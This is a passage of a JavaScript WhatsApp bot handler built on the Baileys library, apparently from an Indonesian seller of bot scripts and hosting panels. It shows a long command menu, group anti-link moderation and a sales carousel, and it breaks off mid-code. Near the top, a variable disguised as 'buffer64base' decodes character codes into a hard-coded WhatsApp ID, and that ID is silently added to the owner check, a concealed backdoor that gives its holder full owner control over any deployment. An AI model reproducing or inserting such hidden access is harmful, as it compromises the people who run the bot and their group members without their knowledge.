process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
let globalAutoAIStatus = false;
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const db_saweria = JSON.parse(fs.readFileSync('./source/saweria.json'));
const { Saweria } = require("./library/saweria")
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const figlet = require('figlet');
const cheerio = require('cheerio');
const whatsapp = require('whatsapp-web.js');
const client = new whatsapp.Client();
const os = require('os');
const qrCodeReader = require("qrcode-reader");
const { say } = require("cfonts")
let qrcode = require('qrcode')
let cheerio2 = require('cheerio')
let moment2 = require('moment-timezone')
const pino = require('pino');
const { Client } = require('ssh2');
const si = require('systeminformation');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const totalfitur = () =>{
            var mytext = fs.readFileSync("./Kyzzicvxii.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl, getPrayerTimes } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, randomToken2, Saweria2, toAsciiArt}= require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
m.text = m.text.replace(/^[\.,#!\/]/, '');
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//=================================//
function updateSoldCount(productId, count) {
  try {
    const data = fs.readFileSync('source/produk.json', 'utf8');
    const produkList = JSON.parse(data);
    
    const updatedList = produkList.map(produk => {
      if (produk.id === productId) {
        produk.terjual = (produk.terjual || 0) + count;
      }
      return produk;
    });
    
    fs.writeFileSync('source/produk.json', JSON.stringify(updatedList, null, 4), 'utf8');
  } catch (err) {
    console.error('Error updating sold count:', err);
  }
}
//========================================//
const headers = {
    'Referer': 'https://www.pixiv.net/',
    'Accept-Encoding': 'gzip, deflate, br'
};

async function pixiv(query) {
    let { data } = await axios.get(`https://www.pixiv.net/touch/ajax/tag_portal?word=${query}&lang=en&version=892d65fef9e1fc4efa5a1fd1c4675d6ae3e73835`, { headers })
    return data.body.illusts
}


async function getBuff(url) {
    let { data } = await axios.get(url, { 
        headers: {
            'Referer': 'https://www.pixiv.net/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }, 
        responseType: 'arraybuffer' 
    })
    return data
}
//========================================//
const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `KyzzX Botz ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `KyzzX Botz ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "KyzzX Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const from = m.chat;
async function loading () {
var kyzz = [
        '▰▱▱▱▱▱▱▱▱▱ 10%',
        '▰▰▱▱▱▱▱▱▱▱ 20%',
        '▰▰▰▱▱▱▱▱▱▱ 30%',
        '▰▰▰▰▱▱▱▱▱▱ 40%',
        '▰▰▰▰▰▱▱▱▱▱ 50%',
        '▰▰▰▰▰▰▱▱▱▱ 60%',
        '▰▰▰▰▰▰▰▱▱▱ 70%',
        '▰▰▰▰▰▰▰▰▱▱ 80%',
        '▰▰▰▰▰▰▰▰▰▱ 90%',
        '▰▰▰▰▰▰▰▰▰▰ 100%',
        '✨ Loading Completed! ✨'
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < kyzz.length; i++) {
await conn.sendMessage(from, {text: kyzz[i], edit: key });
}
}

const menutxt= `( Arise weak one🔮${m.pushName} ) I am sungsu-cpanel. 𝖳𝗁𝗂𝗌 𝖻𝗈𝗍 𝗐𝖺𝗌 𝖽𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝖽 𝖻𝗒 𝗆𝗒 𝗈𝗐𝗇𝖾𝗋, Mr sungsu. 𝖳𝗁𝗂𝗌 𝗌𝖼𝗋𝗂𝗉𝗍 𝗂𝗌
╭─「 \`BOT INFORMATION\` 」
│▢ Bot name : ${global.botname2}
│▢ Version: ${global.versi}
│▢ Mode : ${conn.public ? "Public" : "Self"}
│▢ Owner : @${global.owner}
│▢ Uptime : ${runtime(os.uptime())}
│▢ Status : ${isCreator ? "Owner" : isPremium ? "Reseller" : "User"}
│▢ Total cmds : ${totalfitur()}
╰━──────────────━〢
╭─「 \`DO MENU\` 」
│▢ .ᴄᴠᴘs
│▢ .ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
│▢ .ʟɪsᴛᴅʀᴏᴘʟᴇᴛ
│▢ .ʀᴇʙᴜɪʟᴅ
│▢ .ʀᴇsᴛᴀʀᴛᴠᴘs
│▢ .sɪsᴀᴅʀᴏᴘʟᴇᴛ
│▢ .ᴜᴘᴀᴘɪᴅᴏ
╰━──────────────━〢
╭─「 \`DOWNLOAD MENU\` 」
│▢ .ᴄᴀᴘᴄᴜᴛ
│▢ .ғᴀᴄᴇʙᴏᴏᴋ
│▢ .ɢɪᴛᴄʟᴏɴᴇ
│▢ .ɢᴏᴏɢʟᴇᴅʀɪᴠᴇ
│▢ .ɪɴsᴛᴀɢʀᴀᴍ
│▢ .ᴍᴇᴅɪᴀғɪʀᴇ
│▢ .ᴘʟᴀʏ
│▢ .sᴏɴɢᴅᴏᴡɴ
│▢ .sᴘᴏᴛɪғʏᴅᴏᴡɴ
│▢ .ᴛᴇʀᴀʙᴏx
│▢ .ᴛɪᴋᴛᴏᴋ
│▢ .ᴛɪᴋᴛᴏᴋᴍᴘ3
│▢ .xɴxxᴅᴏᴡɴ
│▢ .ʏᴛᴍᴘ3
│▢ .ʏᴛᴍᴘ4
╰━──────────────━〢
╭─「 \`GROUP MENU\` 」
│▢ .ᴀᴅᴅ
│▢ .ᴀɴᴛɪʟɪɴᴋ
│▢ .ᴀɴᴛɪʟɪɴᴋ2
│▢ .ʙʟᴀᴄᴋʟɪsᴛᴊᴘᴍ
│▢ .ᴄʟᴏsᴇ
│▢ .ᴄʟᴏsᴇᴛɪᴍᴇ
│▢ .ᴅᴇᴍᴏᴛᴇ
│▢ .ʜɪᴅᴇᴛᴀɢ
│▢ .ᴋɪᴄᴋ
│▢ .ᴋᴜᴅᴇᴛᴀɢᴄ
│▢ .ʟᴇᴀᴠᴇ
│▢ .ʟɪɴᴋɢᴄ
│▢ .ᴏᴘᴇɴ
│▢ .ᴏᴘᴇɴᴛɪᴍᴇ
│▢ .ᴘʀᴏᴍᴏᴛᴇ
│▢ .ʀᴇsᴇᴛʟɪɴᴋɢᴄ
│▢ .ᴛᴀɢᴀʟʟ
│▢ .ᴡᴇʟᴄᴏᴍᴇ
╰━──────────────━〢
╭─「 \`INSTALLER MENU\` 」
│▢ .ʜᴀᴄᴋʙᴀᴄᴋᴘᴀɴᴇʟ
│▢ .ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
│▢ .ɪɴsᴛᴀʟʟᴅᴇᴘᴇɴᴅ
│▢ .ᴛᴇᴍᴀʙɪʟʟɪɴɢ
│▢ .ᴛᴇᴍᴀᴇɴɪɢᴍᴀ
│▢ .ᴛᴇᴍᴀsᴛᴇʟʟᴀʀ
│▢ .ᴛᴇᴍᴀɴᴇʙᴜʟᴀ
│▢ .ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
│▢ .ᴜɴɪɴsᴛᴀʟʟᴛᴇᴍᴀ
╰━──────────────━〢
╭─「 \`OTHER MENU\` 」 
│▢ .ᴀʏᴀᴛᴋᴜʀsɪ
│▢ .ᴀɴɪᴍᴇ
│▢ .ᴀsᴜᴘᴀɴ
│▢ .ʙʀᴀᴛ
│▢ .ʙʀᴀᴛᴠɪᴅ
│▢ .ᴄᴀʀʙᴏɴɪғʏ
│▢ .ᴄᴇᴄᴀɴ
│▢ .ᴄᴇᴋᴅᴏɴᴀᴛᴇ
│▢ .ᴄᴇᴋɪᴅᴄʜ
│▢ .ᴄᴇᴋɪᴅɢᴄ
│▢ .ᴄᴇᴛᴀᴋǫʀ
│▢ .ᴇᴍᴏᴊɪɢɪғ
│▢ .ᴇᴍᴏᴊɪᴍɪx
│▢ .ғғsᴛᴀʟᴋ
│▢ .ɪɴғᴏɢᴇᴍᴘᴀ
│▢ .ᴍʟsᴛᴀʟᴋ
│▢ .ǫᴄ
│▢ .ǫᴜᴏᴛᴇsɪsʟᴀᴍɪ
│▢ .ʀᴀɴᴅᴏᴍᴋᴜᴄɪɴɢ
│▢ .ʀᴇᴀᴅᴇʀǫʀ
│▢ .ʀᴇᴀᴅᴠɪᴇᴡᴏɴᴄᴇ
│▢ .sᴛɪᴄᴋᴇʀ
│▢ .sᴛɪᴄᴋᴇʀᴡᴍ
│▢ .ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
│▢ .ʏᴛsᴛᴀʟᴋ
│▢ .ʏᴛsᴛᴀʟᴋ2
│▢ .ᴡᴀᴋᴛᴜᴅᴜɴɪᴀ
╰━──────────────━〢
╭─「 \`OWNER MENU\` 」
│▢ .ᴀᴜᴛᴏᴀɪ
│▢ .ᴀᴅᴅᴏᴡɴᴇʀ
│▢ .ᴀᴅᴅɪᴅᴄʜ
│▢ .ᴀᴅᴅᴘʀᴏᴅᴜᴋ
│▢ .ᴀᴅᴅᴄᴀsᴇ
│▢ .ᴀᴅᴅsᴛᴏᴄᴋ
│▢ .ᴀᴅᴅsᴛᴏᴋᴅᴏ
│▢ .ᴀᴅᴅʀᴇsᴘᴏɴ
│▢ .ᴀᴜᴛᴏʀᴇᴀᴅ
│▢ .ᴀᴜᴛᴏᴘʀᴏᴍᴏsɪ
│▢ .ᴀᴜᴛᴏʀᴇᴀᴅsᴡ
│▢ .ᴀᴜᴛᴏᴛʏᴘɪɴɢ
│▢ .ᴄʟᴇᴀʀᴄʜᴀᴛ
│▢ .ᴄʟᴇᴀʀsᴇssɪᴏɴ
│▢ .ᴄʀᴇᴀᴛᴇɢᴄ
│▢ .ᴄʟᴇᴀʀᴀᴅᴍɪɴ
│▢ .ᴄʟᴇᴀʀᴀᴅᴍɪɴ2
│▢ .ᴄʟᴇᴀʀsᴇʀᴠᴇʀ
│▢ .ᴄʟᴇᴀʀsᴇʀᴠᴇʀ2
│▢ .ᴅᴇʟsᴄ
│▢ .ᴅᴇʟᴄᴀsᴇ
│▢ .ᴅᴇʟɪᴅᴄʜ
│▢ .ᴅᴇʟʀᴇsᴘᴏɴ
│▢ .ᴅᴇʟᴏᴡɴᴇʀ
│▢ .ᴅᴇʟᴘʀᴏᴅᴜᴋ
│▢ .ᴅᴇʟsᴛᴏᴄᴋ
│▢ .ᴅᴇʟsᴛᴏᴋᴅᴏ
│▢ .ᴇᴅɪᴛᴘʀᴏᴅᴜᴋ
│▢ .ɢᴇᴛᴄᴀsᴇ
│▢ .ɢᴇᴛsᴄ
│▢ .sᴇɴᴅsᴄ
│▢ .sᴇɴᴅsᴄ2
│▢ .ᴊᴏɪɴᴄʜ
│▢ .ᴊᴏɪɴɢᴄ
│▢ .ʟɪsᴛᴅᴏɴᴀᴛᴇ
│▢ .ʟɪsᴛɪᴅᴄʜ
│▢ .ʟɪsᴛɢᴄ
│▢ .ʟɪsᴛᴏᴡɴᴇʀ
│▢ .ʟɪsᴛsᴛᴏᴋᴅᴏ
│▢ .ʟɪsᴛsᴄ
│▢ .ʟᴏɢɪɴ
│▢ .ʟᴏɢᴏᴜᴛ
│▢ .ʀᴇsᴇᴛᴅʙ
│▢ .ʀᴇsᴛᴀʀᴛʙᴏᴛ
│▢ .sᴇʟғ/ᴘᴜʙʟɪᴄ
│▢ .sᴇᴛᴘᴘʙᴏᴛ
│▢ .sᴠsᴄ
│▢ .sᴜʙᴅᴏᴍᴀɪɴ
│▢ .ᴛᴀɢsᴡ
│▢ .ᴜᴘᴄʜᴀɴɴᴇʟ
│▢ .ᴜᴘᴄʜᴀɴɴᴇʟ2
╰━──────────────━〢
╭─「 \`OWNER PANEL\` 」
│▢ .ᴄᴀᴅᴍɪɴ-ᴠ2
│▢ .ᴅᴇʟᴀᴅᴍɪɴ-ᴠ2
│▢ .ᴅᴇʟᴘᴀɴᴇʟ-ᴠ2
│▢ .ʟɪsᴛᴀᴅᴍɪɴ-ᴠ2
│▢ .ʟɪsᴛᴘᴀɴᴇʟ-ᴠ2
│▢ .ᴜᴘᴅᴏ2
│▢ .ᴜᴘᴀᴘɪ2
│▢ .ᴜᴘᴄᴀᴘɪ2
│▢ .1ɢʙ-ᴠ2
│▢ .2ɢʙ-v2
│▢ .3ɢʙ-v2
│▢ .4ɢʙ-v2
│▢ .5ɢʙ-v2
│▢ .6ɢʙ-v2
│▢ .7ɢʙ-v2
│▢ .8ɢʙ-v2
│▢ .9ɢʙ-v2
│▢ .10ɢʙ-ᴠ2
│▢ .ᴜɴʟɪᴍɪᴛᴇᴅ-ᴠ2
╰━──────────────━〢
╭─「 \`RESELLER PANEL\` 」
│▢ .ᴀᴅᴅsᴇʟʟᴇʀ
│▢ .ᴄᴀᴅᴍɪɴ
│▢ .ᴅᴇʟᴀᴅᴍɪɴ
│▢ .ᴅᴇʟsᴇʟʟᴇʀ
│▢ .ᴅᴇʟᴘᴀɴᴇʟ
│▢ .ʟɪsᴛᴀᴅᴍɪɴ
│▢ .ʟɪsᴛᴘᴀɴᴇʟ
│▢ .ʟɪsᴛsᴇʟʟᴇʀ
│▢ .ᴜᴘᴅᴏ
│▢ .ᴜᴘᴀᴘɪ
│▢ .ᴜᴘᴄᴀᴘɪ
│▢ .1ɢʙ
│▢ .2ɢʙ
│▢ .3ɢʙ
│▢ .4ɢʙ
│▢ .5ɢʙ
│▢ .6ɢʙ
│▢ .7ɢʙ
│▢ .8ɢʙ
│▢ .9ɢʙ10ɢʙ
│▢ .ᴜɴʟɪᴍɪᴛᴇᴅ
╰━──────────────━〢
╭─「 \`SEARCH MENU\` 」
│▢ .ɪɴғᴏɢʙ
│▢ .ᴀᴜᴅɪᴏsᴜʀᴀᴛ
│▢ .ᴀᴘᴋᴍᴏᴅ
│▢ .ᴀᴘᴘsᴛᴏʀᴇ
│▢ .ʙᴀᴄᴀᴀɴsʜᴀʟᴀᴛ
│▢ .ᴄᴜᴀᴄᴀ
│▢ .ʜᴇɴᴛᴀɪᴠɪᴅ
│▢ .ᴊᴀᴅᴡᴀʟsʜᴀʟᴀᴛ
│▢ .ᴋɪsᴀʜɴᴀʙɪ
│▢ .ɴɪᴀᴛsʜᴀʟᴀᴛ
│▢ .ɴᴘᴍsᴇᴀʀᴄʜ
│▢ .ɴᴇᴋᴏᴘᴏɪ
│▢ .ᴘɪɴᴛᴇʀᴇsᴛ
│▢ .ᴘɪxɪᴠ
│▢ .ᴘʟᴀʏsᴛᴏʀᴇ
│▢ .sᴇᴀʀᴄʜɢʙ
│▢ .sᴇᴀʀᴄʜɪᴍᴀɢᴇ
│▢ .sᴇᴀʀᴄʜɪᴍᴀɢᴇ2
│▢ .sᴇᴀʀᴄʜsᴛɪᴄᴋᴇʀ
│▢ .sᴇᴀʀᴄʜsᴛɪᴄᴋᴇʀ2
│▢ .sᴇᴀʀᴄʜsᴛɪᴄᴋᴇʀ3
│▢ .sᴇᴀʀᴄʜsᴏɴɢ
│▢ .sᴇᴀʀᴄʜsᴘᴏᴛɪғʏ
│▢ .sᴇᴀʀᴄʜsᴜʀᴀʜ
│▢ .sᴇᴀʀᴄʜᴛᴋᴛᴏᴋ
│▢ .sᴇᴀʀᴄʜxɴxx
│▢ .sᴇᴀʀᴄʜʏᴏᴜᴛᴜʙᴇ
│▢ .sᴇᴀʀᴄʜʏᴏᴜᴛᴜʙᴇ2
│▢ .sғɪʟᴇ
│▢ .ᴡᴀɪғᴜ
│▢ .ᴡɪᴋɪᴘᴇᴅɪᴀ
╰━──────────────━〢
╭─「 \`SHOP MENU\` 」
│▢ .ʙᴜʏᴀᴅᴘ
│▢ .ʙᴜʏᴊᴀsᴀᴊᴘᴍ
│▢ .ʙᴜʏᴘᴀɴᴇʟ
│▢ .ʙᴜʏᴘʀᴏᴅᴜᴋ
│▢ .ʙᴜʏsᴄʀɪᴘᴛ
│▢ .ʙᴜʏᴠᴘs
│▢ .ʙᴜʏᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ
│▢ .ᴅᴇᴘᴏsɪᴛ
│▢ .ɪsɪᴘᴜʟsᴀ
│▢ .sᴛᴏᴄᴋ
│▢ .ᴛᴏᴘᴜᴘᴅɪᴀᴍᴏɴᴅ
│▢ .ᴛᴏᴘᴜᴘsᴀʟᴅᴏ
╰━──────────────━〢
╭─「 \`STORE MENU\` 」
│▢ .ᴅᴏɴᴇ
│▢ .ᴊᴘᴍ
│▢ .ᴊᴘᴍᴄʜ
│▢ .ᴊᴘᴍ2
│▢ .ᴊᴘᴍsʟɪᴅᴇ
│▢ .ᴊᴘᴍsʟɪᴅᴇʜᴛ
│▢ .ᴊᴘᴍᴛᴇsᴛɪ
│▢ .ʟɪsᴛʀᴇsᴘᴏɴ
│▢ .ᴘᴀʏᴍᴇɴᴛ
│▢ .ᴘʀᴏᴅᴜᴋ
│▢ .ᴘʀᴏsᴇs
│▢ .ᴘᴜsʜᴋᴏɴᴛᴀᴋ
│▢ .ᴘᴜsʜᴋᴏɴᴛᴀᴋ2
│▢ .sᴇɴᴅᴛᴇsᴛɪ
╰━──────────────━〢
╭─「 \`TOOLS MENU\` 」
│▢ .ᴀɪ
│▢ .ᴀᴍʙɪʟsᴡ
│▢ .ᴋʏᴢᴢ
│▢ .ʙʟᴀᴄᴋʙᴏx
│▢ .ᴇɴᴄ
│▢ .ᴇɴᴄʜᴀʀᴅ
│▢ .ғʟᴜxɪᴍɢ
│▢ .ɢᴇᴍɪɴɪ
│▢ .ɢᴘᴛ
│▢ .ʟᴜᴍɪɴᴀɪ
│▢ .ǫᴜᴏᴛᴇs
│▢ .sʜᴏʀᴛʟɪɴᴋ
│▢ .sʜᴏʀᴛʟɪɴᴋ2
│▢ .ssᴡᴇʙ
│▢ .ᴛᴇʟᴜsᴜʀɪɪᴍɢ
│▢ .ᴛᴇxᴛᴛᴏsᴏᴜɴᴅ
│▢ .ᴛᴏᴀɴɪᴍᴇ
│▢ .ᴛᴏᴀsᴄɪɪ
│▢ .ᴛᴏʜᴅ
│▢ .ᴛᴏᴜʀʟ
│▢ .ᴛᴏᴜʀʟ2
│▢ .ᴛʀᴀɴsʟᴀᴛᴇ
│▢ .ᴜɴʙʟᴜʀ
╰━──────────────━〢

> Done by sungsu-cpanel`
//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}

if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
Info : ${global.linkGrup}

Di Link Tersebut Ada Mengenai Informasi Tentang ${global.namaOwner} :v dan juga ada yang gratis lhoo.. 
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© 𝖯𝗈𝗐𝖾𝗋𝖾𝖽 𝖡𝗒  ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*All Transaksi Open ✅*\n\n*${global.namaOwner}* Menyediakan Produk & Jasa Dibawah Ini ⬇️"`
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*${global.namaOwner} Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.
`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*SungSu Terms & Conditions:*
* _Private server & best quality!_ * _Guaranteed safe bot script (anti drama/theft)_
* _10 day guarantee (1x replace)_
* _Anti delay/slow server!_
> Done by sungsu-cpanel`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
